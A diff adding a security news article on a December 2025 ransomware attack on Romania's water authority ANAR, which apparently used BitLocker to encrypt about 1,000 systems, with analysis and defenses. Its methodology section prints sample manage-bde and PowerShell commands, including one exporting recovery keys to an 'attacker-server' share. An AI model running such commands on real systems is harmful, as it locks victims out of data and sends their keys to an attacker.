@@ -1,0 +1,882 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Romania Water Authority Ransomware Attack: 1,000 Systems Encrypted Using BitLocker | TheHGTech</title>
+    <meta name="description"
+        content="Romanian national water authority hit by ransomware attack encrypting 1,000 systems using Windows BitLocker. Critical infrastructure vulnerability exposed in December 2025.">
+    <meta name="keywords"
+        content="Romania, water authority, ransomware, BitLocker, critical infrastructure, LOTL, living off the land, ICS security">
+    <link rel="canonical" href="https://thehgtech.com/articles/romania-water-ransomware-bitlocker-2025.html">
+
+    <!-- Open Graph -->
+    <meta property="og:title" content="Romania Water Authority Ransomware: BitLocker Used to Encrypt 1,000 Systems">
+    <meta property="og:description"
+        content="Critical infrastructure attack uses Windows native encryption as weapon. IT systems paralyzed but operations continue.">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://thehgtech.com/articles/romania-water-ransomware-bitlocker-2025.html">
+    <meta property="og:image" content="https://thehgtech.com/images/articles/romania-water-ransomware-2025.png">
+
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Romania Water Authority Ransomware Attack">
+    <meta name="twitter:description"
+        content="1,000 systems encrypted using BitLocker in critical infrastructure attack.">
+
+    <!-- Article Meta -->
+    <meta property="article:published_time" content="2025-12-25T00:00:00Z">
+    <meta property="article:author" content="TheHGTech">
+    <meta property="article:section" content="Cybersecurity">
+
+    <!-- Structured Data -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "NewsArticle",
+      "headline": "Romania Water Authority Ransomware Attack: 1,000 Systems Encrypted Using BitLocker",
+      "description": "Major ransomware attack on Romanian national water authority uses Windows native encryption tool as weapon. Critical infrastructure security implications.",
+      "author": {
+        "@type": "Organization",
+        "name": "TheHGTech"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "name": "TheHGTech",
+        "url": "https://thehgtech.com"
+      },
+      "datePublished": "2025-12-25",
+      "dateModified": "2025-12-25",
+      "mainEntityOfPage": "https://thehgtech.com/articles/romania-water-ransomware-bitlocker-2025.html"
+    }
+    </script>
+
+    <link rel="stylesheet" href="/header.css">
+    <link rel="stylesheet" href="/light-mode.css">
+    <link rel="stylesheet" href="/print.css">
+    <link rel="stylesheet" href="/interaction-bar.css?v=20251207-0041">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --bg-primary: #000000;
+            --bg-secondary: #0a0a0a;
+            --bg-card: rgba(255, 255, 255, 0.03);
+            --accent-cyan: #00D9FF;
+            --accent-red: #FF4C4C;
+            --accent-purple: #9D4EDD;
+            --accent-orange: #FF9500;
+            --accent-green: #10b981;
+            --text-primary: #ffffff;
+            --text-secondary: #a0a0a0;
+            --text-muted: #666666;
+            --border: rgba(255, 255, 255, 0.1);
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.7;
+            font-size: 18px;
+        }
+
+        .article-container {
+            max-width: 800px;
+            margin: 80px auto 0;
+            padding: 2rem;
+        }
+
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: var(--accent-cyan);
+            text-decoration: none;
+            margin-bottom: 2rem;
+            font-size: 0.9rem;
+            transition: color 0.3s;
+        }
+
+        .back-link:hover {
+            color: var(--text-primary);
+        }
+
+        .article-header {
+            margin-bottom: 2rem;
+            padding-bottom: 2rem;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .article-category {
+            display: inline-block;
+            background: var(--accent-red);
+            color: white;
+            padding: 0.5rem 1rem;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            margin-bottom: 1rem;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            line-height: 1.2;
+            margin-bottom: 1rem;
+            background: linear-gradient(135deg, var(--accent-red), var(--accent-orange));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .article-excerpt {
+            font-size: 1.25rem;
+            color: var(--text-secondary);
+            margin-bottom: 1.5rem;
+        }
+
+        .article-meta {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1.5rem;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+
+        .article-meta span {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .featured-image {
+            width: 100%;
+            border-radius: 12px;
+            margin: 2rem 0;
+            border: 1px solid var(--border);
+        }
+
+        h2 {
+            color: var(--accent-red);
+            margin: 2.5rem 0 1rem;
+            font-size: 1.6rem;
+        }
+
+        h3 {
+            color: var(--text-primary);
+            margin: 1.5rem 0 1rem;
+            font-size: 1.3rem;
+        }
+
+        p {
+            margin-bottom: 1.5rem;
+            color: var(--text-secondary);
+        }
+
+        .info-box {
+            background: rgba(0, 217, 255, 0.05);
+            border-left: 4px solid var(--accent-cyan);
+            padding: 1.5rem;
+            margin: 2rem 0;
+            border-radius: 8px;
+        }
+
+        .warning-box {
+            background: rgba(255, 76, 76, 0.1);
+            border-left: 4px solid var(--accent-red);
+            padding: 1.5rem;
+            margin: 2rem 0;
+            border-radius: 8px;
+        }
+
+        .success-box {
+            background: rgba(16, 185, 129, 0.1);
+            border-left: 4px solid var(--accent-green);
+            padding: 1.5rem;
+            margin: 2rem 0;
+            border-radius: 8px;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5rem 0;
+            background: var(--bg-card);
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        th,
+        td {
+            padding: 1rem;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+        }
+
+        th {
+            background: rgba(255, 76, 76, 0.1);
+            color: var(--accent-red);
+            font-weight: 600;
+        }
+
+        td {
+            color: var(--text-secondary);
+        }
+
+        .timeline {
+            border-left: 3px solid var(--accent-cyan);
+            padding-left: 2rem;
+            margin: 2rem 0;
+        }
+
+        .timeline-item {
+            margin-bottom: 1.5rem;
+            position: relative;
+        }
+
+        .timeline-item::before {
+            content: '';
+            position: absolute;
+            left: -2.35rem;
+            top: 0.5rem;
+            width: 12px;
+            height: 12px;
+            background: var(--accent-cyan);
+            border-radius: 50%;
+        }
+
+        .timeline-date {
+            color: var(--accent-cyan);
+            font-weight: 600;
+            display: block;
+            margin-bottom: 0.25rem;
+        }
+
+        .timeline-event {
+            color: var(--text-secondary);
+        }
+
+        ul,
+        ol {
+            margin-left: 2rem;
+            margin-bottom: 1.5rem;
+            color: var(--text-secondary);
+        }
+
+        li {
+            margin-bottom: 0.5rem;
+        }
+
+        blockquote {
+            border-left: 4px solid var(--accent-purple);
+            padding-left: 1.5rem;
+            margin: 2rem 0;
+            font-style: italic;
+            color: var(--text-secondary);
+        }
+
+        blockquote cite {
+            display: block;
+            margin-top: 0.5rem;
+            color: var(--accent-purple);
+            font-style: normal;
+            font-weight: 600;
+        }
+
+        .stat-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 1rem;
+            margin: 2rem 0;
+        }
+
+        .stat-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 1.5rem;
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 2rem;
+            font-weight: 700;
+            color: var(--accent-red);
+            display: block;
+        }
+
+        .stat-label {
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+
+        code {
+            background: rgba(0, 217, 255, 0.1);
+            padding: 0.2rem 0.5rem;
+            border-radius: 4px;
+            font-family: 'Fira Code', monospace;
+            color: var(--accent-cyan);
+        }
+
+        pre {
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1rem;
+            overflow-x: auto;
+            margin: 1.5rem 0;
+        }
+
+        pre code {
+            background: none;
+            padding: 0;
+        }
+
+        footer {
+            background: var(--bg-secondary);
+            border-top: 1px solid var(--border);
+            padding: 3rem 2rem;
+            margin-top: 4rem;
+            text-align: center;
+        }
+
+        footer p {
+            color: var(--text-muted);
+            margin: 0;
+        }
+
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 1.8rem;
+            }
+
+            .article-container {
+                padding: 1rem;
+                margin-top: 60px;
+            }
+
+            .article-meta {
+                flex-direction: column;
+                gap: 0.75rem;
+            }
+        }
+    </style>
+
+    <link rel="stylesheet" href="/m-core.css?v=4.2">
+    <link rel="stylesheet" href="/m-layout.css?v=3.2">
+    <link rel="stylesheet" href="/m-components.css?v=3.0">
+    <script src="/m-app.js?v=4.3" defer></script>
+</head>
+
+<body>
+    <!-- Mobile Header -->
+    <header class="m-header m-only">
+        <div class="m-header__logo" style="display: flex; align-items: center; gap: 0.75rem;">
+            <img src="../logo-dark.png" alt="TheHGTech" class="m-logo-img logo-dark"
+                style="height: 28px; width: auto; margin: 0;">
+            <img src="../logo-light.png" alt="TheHGTech" class="m-logo-img logo-light"
+                style="height: 28px; width: auto; margin: 0;">
+            <span
+                style="font-size: 1.2rem; font-weight: 700; background: linear-gradient(135deg, #FF3D3D, #ff8c8c); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;">TheHGTech</span>
+        </div>
+        <div class="m-header__actions">
+            <button class="m-theme-toggle" onclick="mToggleTheme()" aria-label="Toggle Theme">
+                <span class="m-theme-toggle__thumb"></span>
+                <span class="m-theme-toggle__stars"><span class="m-theme-toggle__star"></span><span
+                        class="m-theme-toggle__star"></span></span>
+            </button>
+            <button class="m-header__btn m-header__btn--search" data-action="search" aria-label="Search"><i
+                    class="fas fa-search"></i></button>
+        </div>
+    </header>
+
+    <!-- Bottom Navigation -->
+    <nav class="m-bottom-nav m-only">
+        <a href="/" class="m-bottom-nav__item"><i class="fas fa-home"></i><span>Home</span></a>
+        <a href="/cve-tracker.html" class="m-bottom-nav__item"><i class="fas fa-bug"></i><span>CVE</span></a>
+        <a href="/threat-intel.html" class="m-bottom-nav__item"><i class="fas fa-shield-alt"></i><span>Intel</span></a>
+        <a href="/articles.html" class="m-bottom-nav__item active"><i
+                class="fas fa-newspaper"></i><span>Articles</span></a>
+        <a href="/guides/" class="m-bottom-nav__item"><i class="fas fa-book"></i><span>Guides</span></a>
+    </nav>
+
+    <!-- Header -->
+    <header class="header" role="banner">
+        <div class="header-content">
+            <div class="logo">
+                <a href="../index.html"
+                    style="text-decoration: none; display: flex; align-items: center; gap: 0.75rem;">
+                    <img src="../logo-dark.png" alt="TheHGTech Logo" class="logo-img logo-dark">
+                    <img src="../logo-light.png" alt="TheHGTech Logo" class="logo-img logo-light">
+                    <span class="logo-text">TheHGTech</span>
+                </a>
+            </div>
+            <nav class="nav" role="navigation">
+                <a href="../index.html#news">News</a>
+                <a href="../threat-intel.html">Threat Intelligence <span class="live-badge">LIVE</span></a>
+                <a href="../cve-tracker.html">CVE</a>
+                <a href="../guides/">Guides</a>
+                <a href="../comparisons/">Tool Comparisons</a>
+                <a href="../articles.html">Articles</a>
+            </nav>
+        </div>
+    </header>
+
+    <main class="article-container">
+        <a href="/articles.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Articles</a>
+
+        <article>
+            <header class="article-header">
+                <div class="article-category"><i class="fas fa-shield-alt"></i> Critical Infrastructure</div>
+                <h1>Romania Water Authority Ransomware Attack: 1,000 Systems Encrypted Using BitLocker</h1>
+                <p class="article-excerpt">Threat actors weaponize Windows' own encryption tool against Romania's
+                    national water authority, exposing critical infrastructure vulnerabilities across Eastern Europe.
+                </p>
+                <div class="article-meta">
+                    <span><i class="far fa-calendar-alt"></i> Attack: December 2025</span>
+                    <span><i class="fas fa-clock"></i> Published: Dec 25, 2025</span>
+                    <span><i class="fas fa-book-open"></i> 18 min read</span>
+                </div>
+            </header>
+
+            <img src="/images/articles/romania-water-ransomware-2025.png"
+                alt="Romania Water Authority Ransomware Attack" class="featured-image">
+
+            <div class="warning-box">
+                <strong><i class="fas fa-exclamation-triangle"></i> Critical Infrastructure Attack:</strong> This attack
+                on Romania's national water authority represents a significant escalation in ransomware targeting of
+                critical infrastructure. While operational technology remained unaffected, approximately 1,000 IT
+                systems were encrypted using living-off-the-land techniques.
+            </div>
+
+            <h2><i class="fas fa-file-alt"></i> Executive Summary</h2>
+            <p>In December 2025, Romania's national water authority, <strong>Administrația Națională Apele Române
+                    (ANAR)</strong>, fell victim to a devastating ransomware attack that compromised approximately 1,000
+                systems. What makes this attack particularly notable is the attackers' use of
+                <strong>BitLocker</strong>—Windows' built-in encryption tool—to encrypt files and demand ransom,
+                exemplifying the growing "Living Off the Land" (LOTL) trend in ransomware operations.</p>
+
+            <p>The attack targeted IT infrastructure rather than operational technology (OT), meaning that
+                hydrotechnical structures—dams, reservoirs, and water treatment facilities—remained operational.
+                However, the incident highlights the precarious state of critical infrastructure cybersecurity in
+                Eastern Europe and the potential consequences when IT/OT segmentation is not properly implemented.</p>
+
+            <div class="stat-grid">
+                <div class="stat-card">
+                    <span class="stat-value">~1,000</span>
+                    <span class="stat-label">Systems Encrypted</span>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-value">BitLocker</span>
+                    <span class="stat-label">Attack Tool</span>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-value">ANAR</span>
+                    <span class="stat-label">Target</span>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-value">OT Safe</span>
+                    <span class="stat-label">Operations Status</span>
+                </div>
+            </div>
+
+            <h2><i class="fas fa-building"></i> About the Target: ANAR</h2>
+
+            <p><strong>Administrația Națională Apele Române (ANAR)</strong> is Romania's national water management
+                authority, responsible for:</p>
+
+            <ul>
+                <li><strong>Water resource management:</strong> Managing Romania's rivers, lakes, and groundwater
+                    systems</li>
+                <li><strong>Flood control:</strong> Operating dams, levees, and flood prevention infrastructure</li>
+                <li><strong>Water quality monitoring:</strong> Environmental protection and pollution control</li>
+                <li><strong>Hydrotechnical infrastructure:</strong> Maintaining hundreds of dams and water control
+                    structures</li>
+                <li><strong>Permit issuance:</strong> Regulating water usage for industrial and agricultural purposes
+                </li>
+            </ul>
+
+            <p>ANAR operates across Romania's entire territory, with regional branches managing local water resources.
+                The organization is classified as <strong>critical national infrastructure</strong> under Romanian and
+                EU law, making this attack particularly concerning from a national security perspective.</p>
+
+            <h2><i class="fas fa-cogs"></i> Technical Analysis: BitLocker as a Weapon</h2>
+
+            <h3>The Living Off the Land Approach</h3>
+
+            <p>The attackers' use of BitLocker represents a sophisticated "Living Off the Land" (LOTL) technique. Rather
+                than deploying custom ransomware that might be detected by security tools, the attackers weaponized a
+                legitimate Windows feature that:</p>
+
+            <ul>
+                <li><strong>Is already present on all modern Windows systems</strong> - No need to download malware</li>
+                <li><strong>Is signed by Microsoft</strong> - Trusted by security tools</li>
+                <li><strong>Provides strong encryption</strong> - AES-256, virtually unbreakable without the key</li>
+                <li><strong>Integrates with Active Directory</strong> - Can be deployed at scale via Group Policy</li>
+            </ul>
+
+            <div class="info-box">
+                <strong><i class="fas fa-info-circle"></i> What is LOTL?</strong> Living Off the Land refers to
+                techniques where attackers use legitimate tools already present on target systems rather than bringing
+                in external malware. This approach evades detection because the tools being used are inherently trusted.
+            </div>
+
+            <h3>Likely Attack Chain</h3>
+
+            <p>While specific details of the ANAR attack haven't been publicly disclosed, BitLocker-based ransomware
+                attacks typically follow this pattern:</p>
+
+            <ol>
+                <li><strong>Initial Access:</strong> Likely through phishing, exposed RDP, or VPN vulnerability
+                    exploitation</li>
+                <li><strong>Privilege Escalation:</strong> Gaining Domain Admin or equivalent privileges</li>
+                <li><strong>Reconnaissance:</strong> Mapping the network and identifying high-value targets</li>
+                <li><strong>Persistence:</strong> Establishing backdoor access for continued control</li>
+                <li><strong>Disabling Defenses:</strong> Turning off security tools that might interfere</li>
+                <li><strong>BitLocker Deployment:</strong> Using Group Policy or scripting to enable BitLocker across
+                    systems</li>
+                <li><strong>Key Exfiltration:</strong> Capturing recovery keys before locking systems</li>
+                <li><strong>Encryption:</strong> Systems encrypted with attacker-controlled keys</li>
+                <li><strong>Ransom Demand:</strong> Victims contacted with payment demands</li>
+            </ol>
+
+            <h3>BitLocker Attack Methodology</h3>
+
+            <p>The technical execution of a BitLocker-based attack might include commands like:</p>
+
+            <pre><code># Enable BitLocker on C: drive with random password
+manage-bde -on C: -RecoveryPassword -Used
+
+# Or via PowerShell for mass deployment
+Enable-BitLocker -MountPoint "C:" -EncryptionMethod Aes256 -UsedSpaceOnly -RecoveryPasswordProtector
+
+# Export recovery key to attacker-controlled location
+manage-bde -protectors -get C: > \\attacker-server\keys\%COMPUTERNAME%.txt</code></pre>
+
+            <p>Once BitLocker is enabled and the system reboots, the recovery key is required to access data. If the
+                attacker controls the only copy of the recovery key, the victim has no choice but to pay or lose their
+                data.</p>
+
+            <h2><i class="fas fa-history"></i> Timeline of Events</h2>
+
+            <div class="timeline">
+                <div class="timeline-item">
+                    <span class="timeline-date">December 2025 (Exact Date Undisclosed)</span>
+                    <span class="timeline-event">Threat actors gain initial access to ANAR's network through undisclosed
+                        means. Reconnaissance and privilege escalation activities likely began.</span>
+                </div>
+                <div class="timeline-item">
+                    <span class="timeline-date">December 2025</span>
+                    <span class="timeline-event">Attackers deploy BitLocker across approximately 1,000 systems. File
+                        encryption begins using Windows' native encryption capabilities.</span>
+                </div>
+                <div class="timeline-item">
+                    <span class="timeline-date">December 2025</span>
+                    <span class="timeline-event">ANAR detects the attack when systems become inaccessible. IT
+                        infrastructure severely impacted. Staff resort to alternative communication methods.</span>
+                </div>
+                <div class="timeline-item">
+                    <span class="timeline-date">December 2025</span>
+                    <span class="timeline-event">Romanian authorities, including the National Cyber Security Directorate
+                        (DNSC), notified. Investigation begins.</span>
+                </div>
+                <div class="timeline-item">
+                    <span class="timeline-date">December 2025</span>
+                    <span class="timeline-event">ANAR confirms hydrotechnical infrastructure (OT systems) remains
+                        unaffected. Operations continue with manual procedures.</span>
+                </div>
+            </div>
+
+            <h2><i class="fas fa-exclamation-circle"></i> Impact Assessment</h2>
+
+            <h3>What Was Affected</h3>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>System Type</th>
+                        <th>Status</th>
+                        <th>Impact</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>IT Infrastructure</td>
+                        <td style="color: var(--accent-red);">Encrypted</td>
+                        <td>~1,000 systems compromised</td>
+                    </tr>
+                    <tr>
+                        <td>Email Systems</td>
+                        <td style="color: var(--accent-red);">Disrupted</td>
+                        <td>Staff using alternative communication</td>
+                    </tr>
+                    <tr>
+                        <td>Administrative Systems</td>
+                        <td style="color: var(--accent-red);">Offline</td>
+                        <td>Permitting and documentation affected</td>
+                    </tr>
+                    <tr>
+                        <td>OT/SCADA Systems</td>
+                        <td style="color: var(--accent-green);">Unaffected</td>
+                        <td>Dams and infrastructure operational</td>
+                    </tr>
+                    <tr>
+                        <td>Hydrotechnical Operations</td>
+                        <td style="color: var(--accent-green);">Normal</td>
+                        <td>Water management continues</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Critical Infrastructure Defense Gap</h3>
+
+            <p>ANAR's IT systems were reportedly <strong>not protected by Romania's national defense cyber
+                    system</strong>. This reveals a significant gap in how critical infrastructure cybersecurity is
+                managed in Romania and potentially other countries:</p>
+
+            <ul>
+                <li>Critical infrastructure IT systems may not receive the same protection as government networks</li>
+                <li>Sector-specific agencies may be responsible for their own cybersecurity</li>
+                <li>Resource and budget constraints affect security implementations</li>
+                <li>Lack of centralized visibility into critical infrastructure security posture</li>
+            </ul>
+
+            <blockquote>
+                "The incident highlights that critical infrastructure cannot rely solely on IT/OT segmentation. If IT
+                systems are compromised, operational disruption is inevitable even if OT remains safe."
+                <cite>— TheHGTech Analysis</cite>
+            </blockquote>
+
+            <h2><i class="fas fa-globe-europe"></i> Geopolitical Context</h2>
+
+            <h3>Romania as a Target</h3>
+
+            <p>Romania has become an increasingly attractive target for cyberattacks due to several factors:</p>
+
+            <ul>
+                <li><strong>NATO membership:</strong> As a NATO member, Romania hosts military installations including
+                    the Aegis Ashore missile defense system</li>
+                <li><strong>Ukraine border:</strong> Romania shares a border with Ukraine and has been a key logistics
+                    hub during the ongoing conflict</li>
+                <li><strong>EU membership:</strong> Access to EU systems and databases makes Romanian infrastructure
+                    valuable</li>
+                <li><strong>Black Sea access:</strong> Strategic importance of Black Sea ports and infrastructure</li>
+            </ul>
+
+            <h3>Attribution Considerations</h3>
+
+            <p>While no threat actor has been publicly attributed to this attack, several possibilities exist:</p>
+
+            <ul>
+                <li><strong>Financially motivated cybercriminals:</strong> Ransomware groups targeting critical
+                    infrastructure for payment</li>
+                <li><strong>Hacktivist groups:</strong> Pro-Russian hacktivist groups have targeted Romanian
+                    infrastructure previously</li>
+                <li><strong>State-sponsored actors:</strong> Nation-state actors using ransomware as cover for
+                    destructive operations</li>
+            </ul>
+
+            <p>The Danish Defence Intelligence Service recently attributed attacks on water utilities and DDoS attacks
+                on Danish websites to pro-Russian hacktivist groups, suggesting a pattern of Eastern European water
+                infrastructure targeting.</p>
+
+            <h2><i class="fas fa-chart-line"></i> Critical Infrastructure Ransomware Trends</h2>
+
+            <p>The ANAR attack fits into a broader trend of ransomware targeting critical infrastructure in 2025:</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Sector</th>
+                        <th>Trend</th>
+                        <th>Notable Incidents</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Water Utilities</td>
+                        <td style="color: var(--accent-red);">Increasing</td>
+                        <td>ANAR (Romania), Multiple US utilities</td>
+                    </tr>
+                    <tr>
+                        <td>Healthcare</td>
+                        <td style="color: var(--accent-red);">High</td>
+                        <td>NHS breaches, Hospital chains</td>
+                    </tr>
+                    <tr>
+                        <td>Energy</td>
+                        <td style="color: var(--accent-orange);">Moderate</td>
+                        <td>Power grid targeting</td>
+                    </tr>
+                    <tr>
+                        <td>Transportation</td>
+                        <td style="color: var(--accent-orange);">Moderate</td>
+                        <td>Port attacks, Rail disruptions</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Why Water Utilities Are Targeted</h3>
+
+            <ul>
+                <li><strong>Essential service:</strong> Water is critical—creating pressure to pay quickly</li>
+                <li><strong>Limited budgets:</strong> Water utilities often have less security funding than other
+                    sectors</li>
+                <li><strong>Legacy systems:</strong> Aging infrastructure with known vulnerabilities</li>
+                <li><strong>Fragmented security:</strong> Many utilities lack dedicated cybersecurity staff</li>
+                <li><strong>Public impact:</strong> Disruption creates immediate public and political pressure</li>
+            </ul>
+
+            <h2><i class="fas fa-shield-alt"></i> Defense Recommendations</h2>
+
+            <div class="success-box">
+                <strong><i class="fas fa-check-circle"></i> For Critical Infrastructure Operators:</strong>
+                <ol style="margin-top: 1rem; margin-bottom: 0;">
+                    <li><strong>Implement IT/OT Segmentation:</strong> Ensure operational technology is isolated from IT
+                        networks</li>
+                    <li><strong>Control BitLocker:</strong> Use Group Policy to prevent unauthorized BitLocker
+                        activation</li>
+                    <li><strong>Backup Recovery Keys:</strong> Centralize BitLocker key management with proper access
+                        controls</li>
+                    <li><strong>Monitor for LOTL:</strong> Detect suspicious use of legitimate Windows tools</li>
+                    <li><strong>Air-Gap Critical Controls:</strong> Ensure manual override capabilities for essential
+                        operations</li>
+                    <li><strong>Incident Response Plans:</strong> Develop and test plans specific to ransomware
+                        scenarios</li>
+                </ol>
+            </div>
+
+            <h3>Preventing BitLocker Abuse</h3>
+
+            <p>Organizations can implement several controls to prevent BitLocker from being weaponized:</p>
+
+            <h4>1. Group Policy Controls</h4>
+            <pre><code>Computer Configuration > Administrative Templates > Windows Components > BitLocker Drive Encryption
+- Require additional authentication at startup: Enabled
+- Store BitLocker recovery information in AD DS: Enabled
+- Do not enable BitLocker until recovery information is stored: Enabled</code></pre>
+
+            <h4>2. Monitor BitLocker Events</h4>
+            <p>Key Windows Event IDs to monitor:</p>
+            <ul>
+                <li><strong>Event ID 768:</strong> BitLocker protection enabled</li>
+                <li><strong>Event ID 771:</strong> BitLocker protection disabled</li>
+                <li><strong>Event ID 778:</strong> BitLocker recovery key exported</li>
+            </ul>
+
+            <h4>3. Privileged Access Management</h4>
+            <p>Restrict who can enable BitLocker and access recovery keys through proper PAM implementation.</p>
+
+            <h2><i class="fas fa-balance-scale"></i> Lessons for Other Critical Infrastructure</h2>
+
+            <h3>1. IT Security Is Critical Infrastructure Security</h3>
+            <p>Even with proper IT/OT segmentation, compromised IT systems lead to operational disruptions.
+                Administrative functions, communications, and monitoring all depend on IT.</p>
+
+            <h3>2. LOTL Attacks Are Extremely Effective</h3>
+            <p>Using legitimate tools like BitLocker bypasses many traditional security controls. Organizations must
+                monitor for suspicious use of trusted applications.</p>
+
+            <h3>3. National Cyber Defense Must Cover All Critical Infrastructure</h3>
+            <p>ANAR's systems weren't under Romania's national cyber defense umbrella. This gap exists in many countries
+                and must be addressed.</p>
+
+            <h3>4. Manual Fallback Procedures Are Essential</h3>
+            <p>ANAR's ability to continue operations manually demonstrates the importance of offline procedures.
+                Critical infrastructure must be able to operate without IT systems.</p>
+
+            <h2><i class="fas fa-book"></i> Related Security Guides</h2>
+            <p>For more information on securing critical infrastructure:</p>
+            <ul>
+                <li><a href="/guides/ransomware-response-playbook.html" style="color: var(--accent-cyan);">Ransomware
+                        Response Playbook</a></li>
+                <li><a href="/guides/network-segmentation-zero-trust.html" style="color: var(--accent-cyan);">Network
+                        Segmentation and Zero Trust Architecture</a></li>
+                <li><a href="/guides/incident-response-automation.html" style="color: var(--accent-cyan);">Incident
+                        Response Automation</a></li>
+                <li><a href="/guides/threat-hunting-techniques.html" style="color: var(--accent-cyan);">Threat Hunting
+                        Techniques</a></li>
+            </ul>
+
+            <h2><i class="fas fa-check-square"></i> Key Takeaways</h2>
+            <div class="info-box">
+                <strong><i class="fas fa-key"></i> Summary:</strong>
+                <ul style="margin-top: 1rem; margin-bottom: 0;">
+                    <li>Romania's national water authority (ANAR) suffered a ransomware attack encrypting ~1,000 systems
+                    </li>
+                    <li>Attackers used BitLocker (Windows native encryption) as the ransomware tool—a Living Off the
+                        Land technique</li>
+                    <li>Operational technology (dams, treatment facilities) remained unaffected due to IT/OT
+                        segmentation</li>
+                    <li>The attack highlights gaps in critical infrastructure cybersecurity coverage in Eastern Europe
+                    </li>
+                    <li>Water utilities globally are increasingly targeted due to limited security resources</li>
+                    <li>Organizations must monitor for suspicious use of legitimate tools like BitLocker</li>
+                </ul>
+            </div>
+
+            <div class="article-footer"
+                style="margin-top: 3rem; padding-top: 2rem; border-top: 1px solid var(--border);">
+                <p><strong>Author:</strong> TheHGTech Security Team</p>
+                <p><strong>Published:</strong> December 25, 2025</p>
+                <p><strong>Last Updated:</strong> December 25, 2025</p>
+
+                <div class="related-articles" style="margin-top: 2rem;">
+                    <h3>Related Articles</h3>
+                    <ul>
+                        <li><a href="dxs-nhs-ransomware-breach-2025.html" style="color: var(--accent-cyan);">DXS
+                                International NHS Breach: DevMan Ransomware Claims Healthcare Provider</a></li>
+                        <li><a href="/guides/ransomware-response-playbook.html"
+                                style="color: var(--accent-cyan);">Ransomware Response Playbook</a></li>
+                    </ul>
+                </div>
+            </div>
+        </article>
+
+        <!-- Interaction Bar -->
+        <div class="interaction-bar">
+            <div class="like-section">
+                <button class="like-btn" id="likeBtn" onclick="toggleLike()">
+                    <i class="far fa-heart"></i> <span id="likeText">Like this article</span>
+                </button>
+            </div>
+            <div class="action-buttons">
+                <div class="share-buttons">
+                    <a href="#" onclick="shareTwitter(event)" class="share-btn" title="Share on Twitter">
+                        <i class="fab fa-twitter"></i>
+                    </a>
+                    <a href="#" onclick="shareLinkedIn(event)" class="share-btn" title="Share on LinkedIn">
+                        <i class="fab fa-linkedin-in"></i>
+                    </a>
+                    <button onclick="copyLink()" class="share-btn" title="Copy Link">
+                        <i class="fas fa-link"></i>
+                    </button>
+                </div>
+                <div class="button-separator"></div>
+                <button onclick="window.print()" class="print-btn" title="Print Article">
+                    <i class="fas fa-print"></i>
+                </button>
+            </div>
+        </div>
+    </main>
+
+    <footer>
+        <p>&copy; 2025 TheHGTech. All rights reserved.</p>
+    </footer>
+
+    <script src="/header.js"></script>
+    <script src="/interaction-bar.js?v=20251207-0041"></script>
+    <script src="/command-palette.js" defer></script>
+    <script src="/theme-toggle.js" defer></script>
+</body>
+
+</html>
